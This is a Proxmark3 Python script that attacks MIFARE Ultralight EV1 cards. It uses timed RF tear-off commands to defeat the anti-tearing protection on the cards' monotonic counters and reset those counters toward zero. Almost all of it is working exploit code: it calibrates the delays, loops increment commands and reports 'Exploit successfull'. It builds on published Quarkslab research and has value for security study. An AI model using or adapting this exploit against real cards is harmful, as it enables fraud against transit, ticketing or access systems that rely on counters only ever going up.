#!/usr/bin/env python3

#-----------------------------------------------------------------------------
# Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# See LICENSE.txt for the text of the license.
#-----------------------------------------------------------------------------
# This script bypasses the Anti-Tearing protection on MIFARE Ultralight EV1 monotonic counters and allows resetting the counter value
# Script version: 1.0.0
# Created by W0rthlessS0ul (https://github.com/W0rthlessS0ul)
# Based on Quarkslab research: https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html
#-----------------------------------------------------------------------------

import argparse
import sys
import os
import pm3

try:
    from colors import color
except ModuleNotFoundError:
    def color(s, fg=None):
        _ = fg
        return str(s)

p = pm3.pm3()

ProgramName = os.path.basename(sys.argv[0])
attempt = 0
byte = 1

parser = argparse.ArgumentParser(
    formatter_class=argparse.RawTextHelpFormatter,
    prog=color(f"\n  script run {ProgramName}", "red"),
    epilog=color(f"examples:\n", "green") + color(f"  script run {ProgramName} -c 0\n  script run {ProgramName} -c 0 -i 25\n  script run {ProgramName} -c 0 -i 25 -f True\n  script run {ProgramName} -c 0 -i 25 -f True --BD 2350 --00 225", "yellow")
    )
parser.add_argument('-c', '--cnt', metavar='', type=str, default='0', help='Counter index')
parser.add_argument('-i', '--inc', metavar='', type=int, default=25, help='Increase time steps')
parser.add_argument('-f', '--force', metavar='', type=bool, help='Force start without checking')
parser.add_argument('--DelayBD', metavar='', type=int, help='Manual adjustment of BD delay (disables auto-configuring)')
parser.add_argument('--Delay00', metavar='', type=int, help='Manual adjustment of 00 delay (disables auto-configuring)')

if '-h' in sys.argv or '--help' in sys.argv:
    help_text = parser.format_help()
    help_text = help_text.replace("usage:", f"\n{color('Counter reset of Mifare UL EV1 cards', 'cyan')}\n\nusage:")
    help_text = help_text.replace("options:", color("options:", "green")).replace("usage:", color("usage:", "green"))
    print(help_text)
    sys.exit(0)

args = parser.parse_args()

counter_number = args.cnt

def read_counter(counter_numb):
    p.console(f"hf 14a raw -s -c 39 0{counter_numb}", capture=True)
    counter = str(p.grabbed_output).split(" [ ")[0].replace("[+] ", "").replace(" ", "").lower()
    counter_bytes = bytes.fromhex(counter)
    counter_int = int.from_bytes(counter_bytes, byteorder='little')
    return counter, counter_int
    
def enable_tearoff(delay):
    p.console(f"hw tearoff --delay {delay}")
    p.console("hw tearoff --on", capture=True)
    if str(p.grabbed_output).find("enabled") >= 0:
        return True
    return False

def incr_cnt(counter_numb, StrBytes):
    p.console(f"hf 14a raw -s -c A5 0{counter_numb} {StrBytes} 00")
    p.grabbed_output

def check_tearing_event(counter_numb):
    p.console(f"hf 14a raw -s -c 3E 0{counter_numb}", capture=True)
    tearing = str(p.grabbed_output).split("[+] ")[1].split(" [ ")[0].replace("\n", "").split(" ")[0]
    if tearing == "BD":
        return True, tearing
    return False, tearing

def some_tests(counter_numb):
    try:
        p.console(f"hf 14a raw -s -c 60", capture=True)
        info = str(p.grabbed_output).split("[+] ")[1].split(" [ ")[0].replace("\n", "").split(" ")
        if info[4] != "01":
            print(f"[{color('!', 'red')}] Support only EV1 versions")
            return False
    except:
        print(f"[{color('!', 'red')}] Support only Mifare UL EV1 cards")
        return False
    
    tearing = check_tearing_event(counter_number)[1]
    if tearing != "00" and tearing != "BD":
        print(f"[{color('!', 'red')}] Looks like you're card doesn't support CHECK_TEARING_EVENT")
        return False
    
    counter_str, counter = read_counter(counter_number)
    if counter == 16777215:
        print(f"[{color('!', 'red')}] The counter value is at its maximum, it cannot be reset")
        return False
    elif counter == 0:
        print(f"[{color('!', 'red')}] The counter value is already at the minimum level")
        return False
    
    if counter_str[:4] == "0000":
        print(f"\n[{color('+', 'green')}] First two bytes set to 00, skip")
        byte = 3
    elif counter_str[:2] == "00":
        print(f"\n[{color('+', 'green')}] First byte set to 00, skip")
        byte = 2

    return True

if __name__ == "__main__":
    if not args.force and not some_tests(counter_number):
        print(f"[{color('?', 'goldenrod')}] Try `{color(f'script run {ProgramName} -f True', 'goldenrod')}` if this is a script bug", end="")
        sys.exit(0)
    
    if args.DelayBD == None:
        for Delay_BD in range(1000, 5000, args.inc):
            initial_counter_str, initial_counter_int = read_counter(counter_number)
            enable_tearoff(Delay_BD)
            incr_cnt(counter_number, "010000")
            check_tearing, check_tearing_clear = check_tearing_event(counter_number)
            final_counter_str, final_counter_int = read_counter(counter_number)
            print(f"\r[{color('=', 'goldenrod')}] Testing delay: {color(Delay_BD, 'yellow')} us | Check tearing: {color(check_tearing_clear, 'red') if not check_tearing else color(check_tearing_clear, 'green')} | Counter: {color(final_counter_str.upper(), 'yellow')}", end="", flush=True)
            if final_counter_int > initial_counter_int and check_tearing:
                print(f"\n[{color('+', 'green')}] Work delay for BD: {color(Delay_BD, 'green')} us")
                break
    else:
        Delay_BD = args.DelayBD
        print(f"[{color('+', 'green')}] Work delay for BD: {color(Delay_BD, 'green')} us")
    if args.Delay00 == None:
        for Delay_00 in range(100, 1000, args.inc):
            initial_counter_str, initial_counter_int = read_counter(counter_number)
            enable_tearoff(Delay_00)
            incr_cnt(counter_number, "000000")
            check_tearing, check_tearing_clear = check_tearing_event(counter_number)
            final_counter_str, final_counter_int = read_counter(counter_number)
            print(f"\r[{color('=', 'goldenrod')}] Testing delay: {color(Delay_00, 'yellow')} us | Check tearing: {color(check_tearing_clear, 'green') if not check_tearing else color(check_tearing_clear, 'red')} | Counter: {color(final_counter_str.upper(), 'yellow')}", end="", flush=True)
            if not check_tearing:
                print(f"\n[{color('+', 'green')}] Work delay for 00: {color(Delay_00, 'green')} us")
                incr_cnt(counter_number, "000000")
                break
    else:
        Delay_00 = args.Delay00
        print(f"[{color('+', 'green')}] Work delay for 00: {color(Delay_00, 'green')} us")
    
    constant_counter_int = read_counter(counter_number)[1]
    while True:
        initial_counter_str, initial_counter_int = read_counter(counter_number)

        enable_tearoff(Delay_BD)
        match byte:
            case 1:
                incr_cnt(counter_number, "010000")
            case 2:
                incr_cnt(counter_number, "000100")
            case 3:
                incr_cnt(counter_number, "000001")
        enable_tearoff(Delay_00)
        incr_cnt(counter_number, "000000")

        final_counter_str, final_counter_int = read_counter(counter_number)
        check_tearing, check_tearing_clear = check_tearing_event(counter_number)
        
        attempt+=1
        print(f"\r[{color('=', 'goldenrod')}] Attempt: {color(attempt, 'green')} | Delay BD/00: {color(Delay_BD, 'yellow')}/{color(Delay_00, 'yellow')} us | Check tearing: {color(check_tearing_clear, 'yellow')} | Counter changing: {color(initial_counter_str.upper(), 'red') if initial_counter_int <= final_counter_int else color(initial_counter_str.upper(), 'green')}==>{color(final_counter_str.upper(), 'red') if initial_counter_int <= final_counter_int else color(final_counter_str.upper(), 'green')}", end="", flush=True)

        if attempt % 20 == 0 and constant_counter_int == final_counter_int:
            Delay_BD+=5
            constant_counter_int = final_counter_int
            print(f"\n[{color('=', 'goldenrod')}] BD delay increased {color(Delay_BD, 'green')}")
        elif attempt % 20 == 0 and final_counter_int - constant_counter_int > 10:
            Delay_BD-=5
            constant_counter_int = final_counter_int
            print(f"\n[{color('=', 'goldenrod')}] BD delay reduced {color(Delay_BD, 'red')}")

        if attempt % 5 == 0 and check_tearing:
            Delay_00+=5
            print(f"\n[{color('=', 'goldenrod')}] 00 delay increased {color(Delay_00, 'green')}")

        if attempt % 20 == 0: constant_counter_int = final_counter_int

        if final_counter_int < initial_counter_int and final_counter_str[:2] == "00" and byte == 1:
            if final_counter_str[-4:] == "0000":
                print(f"\n[{color('+', 'green')}] Exploit successfull, all byte set to 00")
                byte = 4
            elif final_counter_str[-4:][:2] == "00":
                print(f"\n[{color('+', 'green')}] Exploit successfull, first two bytes set to 00")
                byte = 3
            else:
                print(f"\n[{color('+', 'green')}] Exploit successfull, first byte set to 00")
                byte = 2
        elif final_counter_int < initial_counter_int and final_counter_str[-4:][:2] == "00" and byte == 2:
            if final_counter_str[-2:] == "00":
                print(f"\n[{color('+', 'green')}] Exploit successfull, all byte set to 00")
                byte = 4
            else:
                print(f"\n[{color('+', 'green')}] Exploit successfull, second byte set to 00")
                byte = 3
        elif final_counter_int < initial_counter_int and final_counter_str[-2:] == "00" and byte == 3:
            print(f"\n[{color('+', 'green')}] Exploit successfull, third byte set to 00")
            byte = 4

        if byte == 4:
            check_tearing, check_tearing_clear = check_tearing_event(counter_number)
            if not check_tearing:
                print(f"\n[{color('#', 'blue')}] Check tearing: {color(check_tearing_clear, 'red')}\n[{color('=', 'goldenrod')}] Copying slot A to B")
            while not check_tearing:
                check_tearing, check_tearing_clear = check_tearing_event(counter_number)
                incr_cnt(counter_number, "000000")
            print(f"[{color('+', 'green')}] Check tearing: {color(check_tearing_clear, 'green')}")

            print(f"\n[{color('+', 'green')}] Exploit successfull\n[{color('=', 'goldenrod')}]  - Initial counter: {initial_counter_str.upper()}\n[{color('=', 'goldenrod')}]  - Final counter: {color(final_counter_str.upper(), 'green')}\n[{color('=', 'goldenrod')}]  - Counter changing: {initial_counter_int - final_counter_int}\n[{color('=', 'goldenrod')}]  - Check tearing: {color(check_tearing_clear, 'green')}", end="")
            sys.exit(0)